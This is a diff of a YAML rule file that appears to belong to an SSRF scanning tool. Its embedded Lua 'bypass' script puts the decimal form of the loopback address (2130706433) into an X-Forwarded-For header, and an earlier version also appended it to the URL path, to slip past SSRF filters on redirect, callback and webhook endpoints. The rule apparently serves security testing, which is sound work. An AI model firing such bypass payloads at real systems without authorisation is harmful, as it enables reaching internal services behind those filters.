@@ -1,48 +1,44 @@
+# 8. decimal_ip.yaml
 meta:
   id: decimal_ip
-  version: 1
+  version: 2
   name: "Decimal IP Representation"
   description: "Uses decimal representation of IPv4 (2130706433)"
   author: "SSRFdevil"
   created: "2026-06-19"
-  updated: "2026-06-19"
+  updated: "2026-07-21"
   rank: 80
   confidence: 90
   severity: high
   tags: [decimal, ipv4, encoding, bypass]
   references: []
+
 match:
   schemes: [http, https]
-  requires: [hostname]
-  supports: [ipv4]
+  kinds: [Endpoint]
+  allowed_methods: [GET, POST]
+  required_tags: [Redirect, Callback, Webhook]
+  require_params: true
+
 script:
   language: lua
   entry: bypass
   source: |
     function bypass(ctx)
-        -- primary context from rule engine (ctx.target, ctx.hostname, ctx.port, ctx.scheme, ctx.path, ctx.user_agent)
-        -- technique logique
-        -- this part could be dynamic too
         local payload_vector = "2130706433" 
-
-        --  Assembling the final scan address based on the target context
-        -- the author has discretion; they may change the parameter or fire directly at the host.
         local path = ctx.path or "/"
         if path:sub(1,1) ~= "/" then path = "/" .. path end
-        local final_url = (ctx.scheme or "http") .. "://" .. ctx.hostname .. (ctx.port and ctx.port ~= "" and ":" .. tostring(ctx.port) or "") .. path .. (ctx.scheme or "http") .. "://" .. payload_vector
+        local final_url = (ctx.scheme or "http") .. "://" .. ctx.hostname .. (ctx.port and ctx.port ~= "" and ":" .. tostring(ctx.port) or "") .. path
         
-        -- configurations of special headers if needed 
         local custom_headers = {}
-        -- custom_headers["User-Agent"] = current_ua or whatever you need
         custom_headers["X-Forwarded-For"] = payload_vector
         custom_headers["Referer"] = ctx.target
 
-        -- final result for executor engine
         return {
             url = final_url,
-            method = "GET", -- or POST/PUT
+            method = "GET",
             headers = custom_headers,
-            body = "",      -- body base methods data. Leave it if you don't need it.
+            body = "",
             action = "scan"
         }
     end
